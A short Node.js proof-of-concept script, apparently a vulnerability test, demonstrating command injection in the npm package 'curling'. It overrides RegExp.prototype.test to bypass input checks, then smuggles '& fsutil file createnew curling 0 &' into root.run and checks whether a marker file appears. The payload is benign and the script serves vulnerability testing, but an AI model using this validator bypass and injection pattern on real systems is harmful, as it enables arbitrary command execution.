
RegExp.prototype.test = () => false;
const root = require('curling');
const fs = require('fs');
const path = './curling';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
root.run('& fsutil file createnew curling 0 &', function (err) {
    if (err)
        throw err;
    else {
        file_exist = fs.existsSync(path);
        console.log('{ ' + file_exist + ', ' + true + ' }');
        fs.unlink(path, function (err) {
        });
    }
});